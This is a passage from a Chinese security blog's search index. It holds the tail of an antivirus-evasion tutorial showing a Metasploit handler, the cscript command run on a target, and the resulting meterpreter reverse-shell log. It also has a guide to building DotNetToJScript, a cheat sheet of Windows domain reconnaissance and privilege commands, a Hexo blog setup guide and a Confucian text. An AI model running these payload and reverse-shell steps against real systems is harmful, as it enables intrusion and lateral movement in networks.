exploit(multi/handler) &gt; set lport 443msf exploit(multi/handler) &gt; run 在目标机器执行如下命令： C:\windows\SysWOW64\cscript.exe /e:JScript MSFWrapper.js kali 反弹回 meterpreter ： 12[*] Started HTTPS reverse handler on https://192.168.1.99:443[*] https://192.168.1.99:443 handling request from 192.168.1.84; (UUID: flnzcixx) Staging x86 payload (180825 bytes) ... 这里一定要注意，因为我们生成的 Payload 跟 exe 都是 32 位的，所以这里也要用 32 的 cscript.exe 去执行。切记！ 0x04 END未完待续 ing……]]></content>
      <categories>
        <category>内网渗透</category>
        <category>免杀</category>
      </categories>
      <tags>
        <tag>免杀</tag>
        <tag>payloads</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源工具DotNetToJScript详细编译教程]]></title>
    <url>%2F2017%2F12%2F18%2F%E5%BC%80%E6%BA%90%E5%B7%A5%E5%85%B7%20DotNetToJScript.html</url>
    <content type="text"><![CDATA[0x00 介绍James Forshaw开源了一个工具DotNetToJScript，能够利用JS/Vbs脚本加载.Net程序，这是一款可以将 .net 程序转换为 jscript 代码的工具。 工具下载：下载地址 0x01 用到工具由于此为开源代码需要自己编译，通过自己的研究终于编译成功。 使用工具vs2017； ndesk-options-0.2.1.bin 文件的引用。 0x02 编译过程 打开vs2017，点击打开项目/解决方案； 打开DotNetToJScript目录下的DotNetToJScript.csproj Visual C# 项目文件； 点击Program.cs生成解决方案； 报错缺少程序集引用 NDesk.Options； 解决办法 需要添加引用 NDesk.Options 下载地址： 点击下载 解压缩，按图添加引用； ​ 浏览—-选择图中文件—-添加； 然后重新生成解决方案即可； ​ ​ ​]]></content>
      <categories>
        <category>内网渗透</category>
        <category>免杀</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo + Next 搭建GitHub page]]></title>
    <url>%2F2017%2F12%2F13%2FHexo%2Bnext.html</url>
    <content type="text"><![CDATA[0x00 准备工作 下载node.js并安装 官网下载安装默认会安装npm； 下载安装git 官网下载安装； 安装hexo，方法：管理员打开cmd：$ npm install -g hexo-cli。 0x01 本地生成hexo文件 在本地新建一个文件夹 e.g. D:/Hexo ； 在D:/Hexo目录下鼠标右键”Git Bash Here”，输入：hexo init; 输入：hexo g 生成静态网页，hexo s 启动本地服务预览； 完成后Hexo文件夹会生成以下内容： 12345678.├── _config.yml├── package.json├── scaffolds├── source| ├── _drafts| └── _posts└── themes 打开本地浏览器 输入：http://localhost:4000 进行访问。 0x02 将本地hexo推送到GitHub 在GitHub上创建名字为 zhangsan.github.io 的项目zhangsan是自己的github用户名； 打开 D:/Hexo/_config.yml 配置文件，修改以下内容为 http://zhangsan.github.io ： 123# URL## If your site is put in a subdirectory, set url as &apos;http://yoursite.com/child&apos; and root as &apos;/child/&apos;url: http://zhangsan.github.io 打开 D:/Hexo/_config配置文件，在文末的deploy做以下设置： 1234deploy: type: git repository: https://github.com/zhangsan/zhangsan.github.io.git branch: master 执行：npm install hexo-deployer-git –save （此命令最好在管理员权限的cmd下执行）； 执行：hexo clear (一般情况下不用执行这个命令，当网站错误打不开的时候再执行它！)； 执行：hexo g （本地生成静态文件）； 执行：hexo d （将本地静态文件推送至Github)； 期间会弹出github登录框按提示登录即可，登录成功一次往后不用重复登录； 通过http://zhangsan.github.io即可访问。 0x03 绑定自己的域名 域名服务商-控制面板-DNS解析—添加CNAME记录：@ &gt;&gt;&gt; zhangsan.github.ioORwww &gt;&gt;&gt; zhangsan.github.io 在Hexo/sorce新建CNAME文件写入域名，CNAME文件，注意没有文件后缀； 执行：hexo g 执行：hexo s（本地预览，可以跳过） 执行：hexo d 0x04 使用next主题并给网站添加浏览器logo 主题下载，next在github下载，并把next文件夹放到temes文件夹； 使用next主题，编辑Hexo/_config.yml以下内容：##Themes: https://hexo.io/themes/theme: next 将尺寸为32x32 favicon.ico 文件放在hexo/source/文件夹内，然后修改Hexo\themes\next\_config.yml为： 12# Put your favicon.ico into `hexo-site/source/` directory.favicon: /favicon.ico 编辑Hexo/_config.yml以下内容： 12# Place your favicon.ico to /source directory.favicon: /favicon.ico 0x05 将网站显示为中文 编辑D:/Hexo/_config.yml配置文件： 12language: zh-Hans #将默认改成zh-Hanstimezone: 在Hexo/next/lanhuages目录下的zh-Hans.yml文件可以自行修改，增加和删除。 0x06 添加菜单和自定义菜单前的图标 编辑themes\next\_config.yml，到menu:字段，在该字段下添加一个字段； 1234menu: home: / about: /about ...... 自定义小图标，关于next使用的小图标你可以通过这个网站Font Awesome来查看自己喜欢的图标，然后copy图标名，编辑Hexo\themes\next\_config.yml，将对应的图标名换成自己喜欢的小图标； 1234567891011menu_icons: enable: true #KeyMapsToMenuItemKey: NameOfTheIconFromFontAwesome home: home about: mortar-board categories: smile-o schedule: calendar tags: diamond archives: angellist sitemap: sitemap commonweal: heartbeat 0x07 隐藏网页底部powered By Hexo / 强力驱动 打开themes/next/layout/_partials/footer.swig,使用””隐藏之间的代码即可，或者直接删除。12345678910&lt;!--&lt;div class=&quot;powered-by&quot;&gt; &#123;&#123; __(&apos;footer.powered&apos;, &apos;&lt;a class=&quot;theme-link&quot; rel=&quot;external nofollow&quot; href=&quot;https://hexo.io&quot;&gt;Hexo&lt;/a&gt;&apos;) &#125;&#125;&lt;/div&gt;&lt;div class=&quot;theme-info&quot;&gt; &#123;&#123; __(&apos;footer.theme&apos;) &#125;&#125; - &lt;a class=&quot;theme-link&quot; rel=&quot;external nofollow&quot; href=&quot;https://github.com/iissnan/hexo-theme-next&quot;&gt; NexT.&#123;&#123; theme.scheme &#125;&#125; &lt;/a&gt;&lt;/div&gt; 0x08 增加本地搜索功能安装 hexo-generator-searchdb，在站点的根目录下执行以下命令：$ npm install hexo-generator-searchdb --save如果报错多执行几次，有的时候是网络原因，最好在管理员权限下的cmd里执行npm安装命令。编辑Hexo/_config.yml，新增以下内容：12345search: path: search.xml field: post format: html limit: 10000 0x09 使用来必力评论功能 到livere注册账号，安装来必力，记录以下内容： 在next/_config.yml的此处加上自己的livere的uid：livere_uid: your uid 然后去博客查看吧文章下面会看到以下景象： 0x10 参考文章(https://thief.one/2017/03/03/Hexo搭建博客教程/)]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows 内网命令收集]]></title>
    <url>%2F2017%2F12%2F09%2FWindows%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4.html</url>
    <content type="text"><![CDATA[Windows 内网命令常见信息收集命令 123456789101112net user 本机用户列表 net localgroup administrators 本机管理员[通常含有域用户] net user /domain 查询域用户 net group /domain 查询域里面的工作组 net group &quot;domain admins&quot; /domain 查询域管理员用户组 net localgroup administrators /domain 登录本机的域管理员 net localgroup administrators workgroup\user001 /add 域用户添加到本机 net group &quot;Domain controllers&quot; 查看域控制器(如果有多台) ipconfig /all 查询本机IP段，所在域等 net view 查询同一域内机器列表 net view /domain 查询域列表 net view /domain:domainname 查看workgroup域中计算机列表 内网(域)渗透–基本命令123456789101112131415161718192021222324ipconfig /all 查询本机IP段，所在域等 net user 本机用户列表 net localgroup administrators 本机管理员[通常含有域用户] net user /domain 查询域用户 net group /domain 查询域里面的工作组 net group &quot;domain admins&quot; /domain 查询域管理员用户组 net localgroup administrators /domain 登录本机的域管理员 net localgroup administrators workgroup\user001 /add 域用户添加到本机 net group &quot;domain controllers&quot; /domain 查看域控制器(如果有多台) net time /domain 判断主域，主域服务器都做时间服务器 net config workstation 当前登录域 net session 查看当前会话 net use \\ip\ipc$ pawword /user:username 建立IPC会话[空连接­***] net share 查看SMB指向的路径[即共享] net view 查询同一域内机器列表 net view \\ip 查询某IP共享 net view /domain 查询域列表 net view /domain:domainname 查看workgroup域中计算机列表 net start 查看当前运行的服务 net accounts 查看本地密码策略 net accounts /domain 查看域密码策略nbtstat –A ip netbios 查询 netstat –an/ano/anb 网络连接查询 route print 路由表 End]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[论语十则]]></title>
    <url>%2F2017%2F12%2F07%2Findex.html</url>
    <content type="text"><![CDATA[《论语·十则》子曰：“学而时习之，不亦说乎？有朋自远方来，不亦乐乎？人不知而不愠，不亦君子乎？”曾子曰：“吾日三省吾身：为人谋而不忠乎？与朋友交而不信乎？传不习乎？” 子曰：“温故而知新，可以为师矣。” 子曰：“学而不思则罔，思而不学则殆。” 子曰：“由，诲女知之乎！知之为知之，不知为不知，是知也。” 子曰：“见贤思齐焉，见不贤而内自省也。” 子曰：“三人行，必有我师焉。择其善者而从之，其不善者而改之。” 曾子曰：“士不可以不弘毅，任重而道远。仁以为己任，不亦重乎？死而后已，不亦远乎？”子曰：“岁寒，然后知松柏之后凋也。” 1子贡问曰：“有一言而可以终身行之者乎？”子曰：“其恕乎！己所不欲，勿施于人。”]]></content>
      <categories>
        <category>文学</category>
      </categories>
      <tags>
        <tag>文学</tag>
        <tag>省身</tag>
      </tags>
  </entry>
</search>
